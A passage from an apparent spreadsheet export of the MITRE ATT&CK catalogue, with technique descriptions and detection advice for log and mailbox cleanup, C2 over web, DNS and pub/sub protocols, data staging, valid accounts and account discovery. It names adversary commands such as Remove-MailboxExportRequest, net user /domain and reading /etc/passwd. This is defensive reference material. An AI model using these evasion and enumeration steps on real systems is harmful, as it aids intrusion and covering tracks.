Network connection history may be stored in various locations. For example, RDP connection history may be stored in Windows Registry values under (Citation: Microsoft RDP Removal):
* &lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&lt;/code&gt;
* &lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&lt;/code&gt;
Windows may also store information about recent RDP connections in files such as &lt;code&gt;C:\Users\\%username%\Documents\Default.rdp&lt;/code&gt; and `C:\Users\%username%\AppData\Local\Microsoft\Terminal
Server Client\Cache\`.(Citation: Moran RDPieces) Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in `/Library/Logs` and/or `/var/log/`).(Citation: Apple Culprit Access)(Citation: FreeDesktop Journal)(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)
Malicious network connections may also require changes to third-party applications or network configuration settings, such as [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004) or tampering to enable [Proxy](https://attack.mitre.org/techniques/T1090). Adversaries may delete or modify this data to conceal indicators and/or impede defensive analysis.</t>
  </si>
  <si>
    <t>T1070.008</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Command: Command Execution, File: File Deletion, File: File Modification, Process: Process Creation</t>
  </si>
  <si>
    <t>Linux, Office Suite, Windows, macOS</t>
  </si>
  <si>
    <t>Adversaries may modify mail and mail application data to remove evidence of their activity. Email applications allow users and other programs to export and delete mailbox data via command line tools or use of APIs. Mail application data can be emails, email metadata, or logs generated by the application or operating system, such as export requests. 
Adversaries may manipulate emails and mailbox data to remove logs, artifacts, and metadata, such as evidence of [Phishing](https://attack.mitre.org/techniques/T1566)/[Internal Spearphishing](https://attack.mitre.org/techniques/T1534), [Email Collection](https://attack.mitre.org/techniques/T1114), [Mail Protocols](https://attack.mitre.org/techniques/T1071/003) for command and control, or email-based exfiltration such as [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048). For example, to remove evidence on Exchange servers adversaries have used the &lt;code&gt;ExchangePowerShell&lt;/code&gt; [PowerShell](https://attack.mitre.org/techniques/T1059/001) module, including &lt;code&gt;Remove-MailboxExportRequest&lt;/code&gt; to remove evidence of mailbox exports.(Citation: Volexity SolarWinds)(Citation: ExchangePowerShell Module) On Linux and macOS, adversaries may also delete emails through a command line utility called &lt;code&gt;mail&lt;/code&gt;  or use [AppleScript](https://attack.mitre.org/techniques/T1059/002) to interact with APIs on macOS.(Citation: Cybereason Cobalt Kitty 2017)(Citation: mailx man page)
Adversaries may also remove emails and metadata/headers indicative of spam or suspicious activity (for example, through the use of organization-wide transport rules) to reduce the likelihood of malicious emails being detected by security products.(Citation: Microsoft OAuth Spam 2022)</t>
  </si>
  <si>
    <t>T1070.009</t>
  </si>
  <si>
    <t>Clear Persistence (T1070.009)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Deletion, File: File Modification, Process: Process Creation, Scheduled Job: Scheduled Job Modification, User Account: User Account Deletion, Windows Registry: Windows Registry Key Deletion, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Adversaries may clear artifacts associated with previously established persistence on a host system to remove evidence of their activity. This may involve various actions, such as removing services, deleting executables, [Modify Registry](https://attack.mitre.org/techniques/T1112), [Plist File Modification](https://attack.mitre.org/techniques/T1647), or other methods of cleanup to prevent defenders from collecting evidence of their persistent presence.(Citation: Cylance Dust Storm) Adversaries may also delete accounts previously created to maintain persistence (i.e. [Create Account](https://attack.mitre.org/techniques/T1136)).(Citation: Talos - Cisco Attack 2022)
In some instances, artifacts of persistence may also be removed once an adversary’s persistence is executed in order to prevent errors with the new instance of the malware.(Citation: NCC Group Team9 June 2020)</t>
  </si>
  <si>
    <t>T1070.010</t>
  </si>
  <si>
    <t>Relocate Malware (T1070.010)</t>
  </si>
  <si>
    <t>Once a payload is delivered, adversaries may reproduce copies of the same malware on the victim system to remove evidence of their presence and/or avoid defenses. Copying malware payloads to new locations may also be combined with [File Deletion](https://attack.mitre.org/techniques/T1070/004) to cleanup older artifacts.
Relocating malware may be a part of many actions intended to evade defenses. For example, adversaries may copy and rename payloads to better blend into the local environment (i.e., [Match Legitimate Name or Location](https://attack.mitre.org/techniques/T1036/005)).(Citation: DFIR Report Trickbot June 2023) Payloads may also be repositioned to target [File/Path Exclusions](https://attack.mitre.org/techniques/T1564/012) as well as specific locations associated with establishing [Persistence](https://attack.mitre.org/tactics/TA0003).(Citation: Latrodectus APR 2024)
Relocating malicious payloads may also hinder defensive analysis, especially to separate these payloads from earlier events (such as [User Execution](https://attack.mitre.org/techniques/T1204) and [Phishing](https://attack.mitre.org/techniques/T1566)) that may have generated alerts or otherwise drawn attention from defenders.</t>
  </si>
  <si>
    <t>T1071</t>
  </si>
  <si>
    <t>Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 
Adversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, DNS, or publishing/subscribing. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP.(Citation: Mandiant APT29 Eye Spy Email Nov 22) </t>
  </si>
  <si>
    <t>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application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)</t>
  </si>
  <si>
    <t>T1071.001</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 
Protocols such as HTTP/S(Citation: CrowdStrike Putter Panda) and WebSocket(Citation: Brazking-Websockets) that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. </t>
  </si>
  <si>
    <t xml:space="preserve">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application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)
Monitor for web traffic to/from known-bad or suspicious domains. </t>
  </si>
  <si>
    <t>T1071.002</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 
Protocols such as SMB(Citation: US-CERT TA18-074A), FTP(Citation: ESET Machete July 2019), FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. </t>
  </si>
  <si>
    <t>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application layer protocols that do not follow the expected protocol for the port that is being used.(Citation: University of Birmingham C2)</t>
  </si>
  <si>
    <t>T1071.003</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 
Protocols such as SMTP/S, POP3/S, and IMAP that carry electronic mail may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: FireEye APT28) </t>
  </si>
  <si>
    <t>T1071.004</t>
  </si>
  <si>
    <t xml:space="preserve">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The DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: PAN DNS Tunneling)(Citation: Medium DnsTunneling) </t>
  </si>
  <si>
    <t>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application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)
Monitor for DNS traffic to/from known-bad or suspicious domains.</t>
  </si>
  <si>
    <t>T1071.005</t>
  </si>
  <si>
    <t>Publish/Subscribe Protocols (T1071.005)</t>
  </si>
  <si>
    <t>Adversaries may communicate using publish/subscribe (pub/sub) application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 
Protocols such as &lt;code&gt;MQTT&lt;/code&gt;, &lt;code&gt;XMPP&lt;/code&gt;, &lt;code&gt;AMQP&lt;/code&gt;, and &lt;code&gt;STOMP&lt;/code&gt; use a publish/subscribe design, with message distribution managed by a centralized broker.(Citation: wailing crab sub/pub)(Citation: Mandiant APT1 Appendix) Publishers categorize their messages by topics, while subscribers receive messages according to their subscribed topics.(Citation: wailing crab sub/pub) An adversary may abuse publish/subscribe protocols to communicate with systems under their control from behind a message broker while also mimicking normal, expected traffic.</t>
  </si>
  <si>
    <t>T1072</t>
  </si>
  <si>
    <t>Execution, Lateral Movement</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Process: Process Creation</t>
  </si>
  <si>
    <t>Linux, Network, SaaS, Windows, macOS</t>
  </si>
  <si>
    <t>Adversaries may gain access to and use centralized software suites installed within an enterprise to execute commands and move laterally through the network. Configuration management and software deployment applications may be used in an enterprise network or cloud environment for routine administration purposes. These systems may also be integrated into CI/CD pipelines. Examples of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft Intune, Azure Arc, and GCP Deployment Manager.  
Access to network-wide or enterprise-wide endpoint management software may enable an adversary to achieve remote code execution on all connected systems. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.
SaaS-based configuration management services may allow for broad [Cloud Administration Command](https://attack.mitre.org/techniques/T1651) on cloud-hosted instances, as well as the execution of arbitrary commands on on-premises endpoints. For example, Microsoft Configuration Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to Entra ID.(Citation: SpecterOps Lateral Movement from Azure to On-Prem AD 2020) Such services may also utilize [Web Protocols](https://attack.mitre.org/techniques/T1071/001) to communicate back to adversary owned infrastructure.(Citation: Mitiga Security Advisory: SSM Agent as Remote Access Trojan)
Network infrastructure devices may also have configuration management tools that can be similarly abused by adversaries.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)
The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to access specific functionality.</t>
  </si>
  <si>
    <t>Detection methods will vary depending on the type of third-party software or system and how it is typically used. 
The same investigation process can be applied here as with other potentially malicious activities where the distribution vector is initially unknown but the resulting activity follows a discernible pattern. Analyze the process execution trees, historical activities from the third-party application (such as what types of files are usually pushed), and the resulting activities or events from the file/binary/script pushed to systems. 
Often these third-party applications will have logs of their own that can be collected and correlated with other data from the environment. Ensure that third-party application logs are on-boarded to the enterprise logging system and the logs are regularly reviewed. Audit software deployment logs and look for suspicious or unauthorized activity. A system not typically used to push software to clients that suddenly is used for such a task outside of a known admin function may be suspicious. Monitor account login activity on these applications to detect suspicious/abnormal usage.
Perform application deployment at regular times so that irregular deployment activity stands out. Monitor process activity that does not correlate to known good software. Monitor account login activity on the deployment system.</t>
  </si>
  <si>
    <t>T1074</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Access, File: File Creation, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Adversaries may stage collected data in a central location or directory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location.(Citation: PWC Cloud Hopper April 2017)
In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.(Citation: Mandiant M-Trends 2020)
Adversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection.</t>
  </si>
  <si>
    <t>Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.
Monitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).
Consider monitoring accesses and modifications to storage repositories (such as the Windows Registry), especially from suspicious processes that could be related to malicious data collection.</t>
  </si>
  <si>
    <t>T1074.001</t>
  </si>
  <si>
    <t>Local Data Staging (T1074.001)</t>
  </si>
  <si>
    <t>Adversaries may stage collected data in a central location or directory on the local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Adversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.(Citation: Prevailion DarkWatchman 2021)</t>
  </si>
  <si>
    <t>Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.
Monitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).
Consider monitoring accesses and modifications to local storage repositories (such as the Windows Registry), especially from suspicious processes that could be related to malicious data collection.</t>
  </si>
  <si>
    <t>T1074.002</t>
  </si>
  <si>
    <t>Remote Data Staging (T1074.002)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Access, File: File Creation</t>
  </si>
  <si>
    <t>Adversaries may stage data collected from multiple systems in a central location or directory on one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In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.(Citation: Mandiant M-Trends 2020)
By staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection.</t>
  </si>
  <si>
    <t>Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.
Monitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).</t>
  </si>
  <si>
    <t>T1078</t>
  </si>
  <si>
    <t>Defense Evasion, Initial Access, Persistence, Privilege Escalation</t>
  </si>
  <si>
    <t>Logon Session: Logon Session Creation, Logon Session: Logon Session Metadata, User Account: User Account Authentication</t>
  </si>
  <si>
    <t>Containers, IaaS, Identity Provider, Linux, Network, Office Suite, SaaS, Windows, macOS</t>
  </si>
  <si>
    <t>Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.
In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)
The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)</t>
  </si>
  <si>
    <t>Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services.(Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).
Perform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence. Checks on these accounts could also include whether default accounts such as Guest have been activated. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.</t>
  </si>
  <si>
    <t>T1078.001</t>
  </si>
  <si>
    <t>Default Accounts (T1078.001)</t>
  </si>
  <si>
    <t>Logon Session: Logon Session Creation, User Account: User Account Authentication</t>
  </si>
  <si>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</si>
  <si>
    <t>Monitor whether default accounts have been activated or logged into. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.</t>
  </si>
  <si>
    <t>T1078.002</t>
  </si>
  <si>
    <t>Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.(Citation: TechNet Credential Theft) Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.(Citation: Microsoft AD Accounts)
Adversaries may compromise domain accounts, some with a high level of privileges, through various means such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or password reuse, allowing access to privileged resources of the domain.</t>
  </si>
  <si>
    <t>Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services.(Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).
On Linux, check logs and other artifacts created by use of domain authentication services, such as the System Security Services Daemon (sssd).(Citation: Ubuntu SSSD Docs) 
Perform regular audits of domain accounts to detect accounts that may have been created by an adversary for persistence.</t>
  </si>
  <si>
    <t>T1078.003</t>
  </si>
  <si>
    <t>Containers, Linux, Network, Windows, macOS</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.
Local Accounts may also be abused to elevate privileges and harvest credentials through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement. </t>
  </si>
  <si>
    <t>Perform regular audits of local system accounts to detect accounts that may have been created by an adversary for persistence. Look for suspicious account behavior, such as accounts logged in at odd times or outside of business hours.</t>
  </si>
  <si>
    <t>T1078.004</t>
  </si>
  <si>
    <t xml:space="preserve">Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory. (Citation: AWS Identity Federation)(Citation: Google Federating GC)(Citation: Microsoft Deploying AD Federation)
Service or user accounts may be targeted by adversaries through [Brute Force](https://attack.mitre.org/techniques/T1110), [Phishing](https://attack.mitre.org/techniques/T1566), or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto [Remote Services](https://attack.mitre.org/techniques/T1021). High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based [Software Deployment Tools](https://attack.mitre.org/techniques/T1072) to run commands on hybrid-joined devices.
An adversary may create long lasting [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication. 
Cloud accounts may also be able to assume [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005) or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through [Cloud API](https://attack.mitre.org/techniques/T1059/009) or other methods. 
</t>
  </si>
  <si>
    <t>Monitor the activity of cloud accounts to detect abnormal or malicious behavior, such as accessing information outside of the normal function of the account or account usage at atypical hours.</t>
  </si>
  <si>
    <t>T1080</t>
  </si>
  <si>
    <t>File: File Creation, File: File Modification, Network Share: Network Share Access, Process: Process Creation</t>
  </si>
  <si>
    <t>Linux, Office Suite, SaaS, Windows, macOS</t>
  </si>
  <si>
    <t xml:space="preserve">
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valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.
A directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses [Shortcut Modification](https://attack.mitre.org/techniques/T1547/009) of directory .LNK files that use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like the real directories, which are hidden through [Hidden Files and Directories](https://attack.mitre.org/techniques/T1564/001). The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. (Citation: Retwin Directory Share Pivot)
Adversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.</t>
  </si>
  <si>
    <t>Processes that write or overwrite many files to a network shared directory may be suspicious. Monitor processes that are executed from removable media for malicious or abnormal activity such as network connections due to Command and Control and possible network Discovery techniques.
Frequently scan shared network directories for malicious files, hidden files, .LNK files, and other file types that may not typical exist in directories used to share specific types of content.</t>
  </si>
  <si>
    <t>T1082</t>
  </si>
  <si>
    <t>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 (e.g. &lt;code&gt;show version&lt;/code&gt;).(Citation: US-CERT-TA18-106A) [System Information Discovery](https://attack.mitre.org/techniques/T1082) combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.(Citation: OSX.FairyTale)(Citation: 20 macOS Common Tools and Techniques)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t>
  </si>
  <si>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</si>
  <si>
    <t>T1083</t>
  </si>
  <si>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</si>
  <si>
    <t xml:space="preserve">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Further, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands may also be used to gather file and directory information with built-in features native to the network device platform.  Monitor CLI activity for unexpected or unauthorized use of commands being run by non-standard users from non-standard locations.  </t>
  </si>
  <si>
    <t>T1087</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Access, Process: Process Creation</t>
  </si>
  <si>
    <t>IaaS, Identity Provider, Linux, Office Suite, SaaS, Windows, macOS</t>
  </si>
  <si>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</si>
  <si>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enumerate user accounts, such as &lt;code&gt;net.exe&lt;/code&gt; and &lt;code&gt;net1.exe&lt;/code&gt;, especially when executed in quick succession.(Citation: Elastic - Koadiac Detection with EQL)</t>
  </si>
  <si>
    <t>T1087.001</t>
  </si>
  <si>
    <t>Local Account (T1087.001)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Access, Group: Group Enumeration, Process: OS API Execution, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.
Commands such as &lt;code&gt;net user&lt;/code&gt; and &lt;code&gt;net localgroup&lt;/code&gt; of the [Net](https://attack.mitre.org/software/S0039) utility and &lt;code&gt;id&lt;/code&gt; and &lt;code&gt;groups&lt;/code&gt; on macOS and Linux can list local users and groups.(Citation: Mandiant APT1)(Citation: id man page)(Citation: groups man page) On Linux, local users can also be enumerated through the use of the &lt;code&gt;/etc/passwd&lt;/code&gt; file. On macOS the &lt;code&gt;dscl . list /Users&lt;/code&gt; command can be used to enumerate local accounts.</t>
  </si>
  <si>
    <t>T1087.002</t>
  </si>
  <si>
    <t>Command: Command Execution, Group: Group Enumeration, Network Traffic: Network Traffic Content, Process: OS API Execution, Process: Process Creation</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior such as targeting specific accounts which possess particular privileges.
Commands such as &lt;code&gt;net user /domain&lt;/code&gt; and &lt;code&gt;net group /domain&lt;/code&gt; of the [Net](https://attack.mitre.org/software/S0039) utility, &lt;code&gt;dscacheutil -q group&lt;/code&gt; on macOS, and &lt;code&gt;ldapsearch&lt;/code&gt; on Linux can list domain users and groups. [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets including &lt;code&gt;Get-ADUser&lt;/code&gt; and &lt;code&gt;Get-ADGroupMember&lt;/code&gt; may enumerate members of Active Directory groups.(Citation: CrowdStrike StellarParticle January 2022)  </t>
  </si>
  <si>
    <t xml:space="preserve">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t>
  </si>
  <si>
    <t>T1087.003</t>
  </si>
  <si>
    <t>Email Account (T1087.003)</t>
  </si>
  <si>
    <t>Office Suite, Windows</t>
  </si>
  <si>
    <t>Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).(Citation: Microsoft Exchange Address Lists)
In on-premises Exchange and Exchange Online, the &lt;code&gt;Get-GlobalAddressList&lt;/code&gt; PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.(Citation: Microsoft getglobaladdresslist)(Citation: Black Hills Attacking Exchange MailSniper, 2016)
In Google Workspace, the GAL is shared with Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook (GWSMO) service. Additionally, the Google Workspace Directory allows for users to get a listing of other users within the organization.(Citation: Google Workspace Global Access List)</t>
  </si>
  <si>
    <t>T1087.004</t>
  </si>
  <si>
    <t>Adversaries may attempt to get a listing of cloud accounts. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application.
With authenticated access there are several tools that can be used to find accounts. The &lt;code&gt;Get-MsolRoleMember&lt;/code&gt; PowerShell cmdlet can be used to obtain account names given a role or permissions group in Office 365.(Citation: Microsoft msolrolemember)(Citation: GitHub Raindance) The Azure CLI (AZ CLI) also provides an interface to obtain user accounts with authenticated access to a domain. The command &lt;code&gt;az ad user list&lt;/code&gt; will list all users within a domain.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018) 
The AWS command &lt;code&gt;aws iam list-users&lt;/code&gt; may be used to obtain a list of users in the current account while &lt;code&gt;aws iam list-roles&lt;/code&gt; can obtain IAM roles that have a specified path prefix.(Citation: AWS List Roles)(Citation: AWS List Users) In GCP, &lt;code&gt;gcloud iam service-accounts list&lt;/code&gt; and &lt;code&gt;gcloud projects get-iam-policy&lt;/code&gt; may be used to obtain a listing of service accounts and users in a project.(Citation: Google Cloud - IAM Servie Accounts List API)</t>
  </si>
  <si>
    <t>Monitor processes, command-line arguments, and logs for actions that could be taken to gather information about cloud accounts, including the use of calls to cloud APIs that perform account discovery.
System and network discovery techniques normally occur throughout an operation as an adversary learns the environment, and also to an extent in normal network operations. Therefore discovery data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.</t>
  </si>
  <si>
    <t>T1090</t>
  </si>
  <si>
    <t>Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow</t>
  </si>
  <si>
    <t>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reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.
Adversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.</t>
  </si>
  <si>
    <t>Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server or between clients that should not or often do not communicate with one another). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)
Consider monitoring for traffic to known anonymity networks (such as [Tor](https://attack.mitre.org/software/S0183)).</t>
  </si>
  <si>
    <t>T1090.001</t>
  </si>
  <si>
    <t>Internal Proxy (T1090.001)</t>
  </si>
  <si>
    <t>Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.
By using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.</t>
  </si>
  <si>
    <t>Analyze network data for uncommon data flows between clients that should not or often do not communicate with one another. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)</t>
  </si>
  <si>
    <t>T1090.002</t>
  </si>
  <si>
    <t>External Proxy (T1090.002)</t>
  </si>
